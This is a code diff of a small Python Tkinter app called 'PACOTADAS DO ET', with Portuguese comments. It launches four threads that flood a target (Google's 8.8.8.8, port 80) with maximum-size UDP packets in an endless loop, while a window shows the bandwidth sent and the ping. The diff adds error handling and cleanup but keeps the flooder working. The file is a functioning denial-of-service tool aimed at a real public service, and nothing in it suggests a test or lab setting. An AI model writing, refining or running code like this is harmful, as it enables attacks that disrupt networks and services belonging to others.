@@ -1,85 +1,94 @@
 import tkinter as tk
 import threading
+import psutil
 import time
 import subprocess
 import socket
 import sys
 
-import psutil
-import win32pdh
+try:
+    import win32pdh
+except Exception as e:
+    win32pdh = None
+    pdh_error = str(e)
+else:
+    pdh_error = None
 
 # CONFIGURAÇÕES
 TARGET_IP = "8.8.8.8"
 TARGET_PORT = 80
 BUFFER_SIZE = 65507
 FLOOD_THREADS = 4
-INTERFACE_NAME = "Ethernet"  # exato
+INTERFACE_NAME = "Ethernet"
 
-# Inicia consulta PDH
-query = win32pdh.OpenQuery()
-counter_path = fr"\Network Interface({INTERFACE_NAME})\Bytes Total/sec"
-counter = win32pdh.AddCounter(query, counter_path)
-win32pdh.CollectQueryData(query)  # amostra inicial
+# PDH setup
+query = counter = None
+if win32pdh:
+    try:
+        query = win32pdh.OpenQuery()
+        path = rf"\Network Interface({INTERFACE_NAME})\Bytes Total/sec"
+        counter = win32pdh.AddCounter(query, path)
+        win32pdh.CollectQueryData(query)
+    except Exception as e:
+        pdh_error = f"PDH setup failed: {e}"
 
+# Função flood
 def flood_packets():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = b'A' * BUFFER_SIZE
-    sent_count = 0
-    while True:
-        try:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        payload = b'A' * BUFFER_SIZE
+        while True:
             s.sendto(payload, (TARGET_IP, TARGET_PORT))
-            sent_count += 1
-            if sent_count % 1000 == 0:
-                print(f"Pacotes enviados: {sent_count}")
-        except Exception as e:
-            print(f"Erro no envio: {e}", file=sys.stderr)
-            time.sleep(1)
+    except Exception as e:
+        print("Flood error:", e, file=sys.stderr)
 
+# Função ping
 def get_ping(ip):
     try:
-        result = subprocess.run(
-            ["ping", "-n", "1", ip], capture_output=True, text=True
-        )
-        for line in result.stdout.splitlines():
+        res = subprocess.run(["ping", "-n", "1", ip], capture_output=True, text=True)
+        for line in res.stdout.splitlines():
             if "tempo=" in line or "time=" in line:
-                return line.split("tempo=")[-1].split()[0] if "tempo=" in line else line.split("time=")[-1].split()[0]
+                return (line.split("tempo=")[-1] if "tempo=" in line else line.split("time=")[-1]).split()[0]
     except:
         return "Erro"
     return "Timeout"
 
+# Atualiza GUI
 def update_info():
+    if pdh_error:
+        status_var.set(pdh_error)
+        return
     while True:
-        # coleta nova amostra e formata
-        win32pdh.CollectQueryData(query)
-        _, val = win32pdh.GetFormattedCounterValue(counter, win32pdh.PDH_FMT_DOUBLE)
-        mbps = val * 8 / 1_000_000  # Bytes/sec -> Megabits/sec
-        ping = get_ping(TARGET_IP)
-        status_var.set(f"TX: {mbps:.1f} Mbps    Ping: {ping}")
+        try:
+            win32pdh.CollectQueryData(query)
+            _, val = win32pdh.GetFormattedCounterValue(counter, win32pdh.PDH_FMT_DOUBLE)
+            mbps = val * 8 / 1_000_000
+            ping = get_ping(TARGET_IP)
+            status_var.set(f"TX: {mbps:.1f} Mbps    Ping: {ping}")
+        except Exception as e:
+            status_var.set(f"Update error: {e}")
+            break
         time.sleep(1)
 
-# GUI
+# Monta GUI
 root = tk.Tk()
 root.title("PACOTADAS DO ET")
 root.geometry("400x150")
 root.resizable(False, False)
 root.configure(bg="black")
 
-tk.Label(
-    root, text="PACOTADAS DO ET",
-    font=("Helvetica", 24, "bold"),
-    fg="lime", bg="black"
-).pack(pady=20)
+tk.Label(root, text="PACOTADAS DO ET",
+         font=("Helvetica", 24, "bold"), fg="lime", bg="black")\
+  .pack(pady=10)
 
-status_var = tk.StringVar()
-tk.Label(
-    root, textvariable=status_var,
-    font=("Consolas", 18), fg="white", bg="black"
-).pack()
+status_var = tk.StringVar(value="Inicializando...")
+tk.Label(root, textvariable=status_var,
+         font=("Consolas", 16), fg="white", bg="black")\
+  .pack(pady=10)
 
-# Threads
+# Start threads only if GUI built
+threading.Thread(target=update_info, daemon=True).start()
 for _ in range(FLOOD_THREADS):
     threading.Thread(target=flood_packets, daemon=True).start()
-
-threading.Thread(target=update_info, daemon=True).start()
 
 root.mainloop()
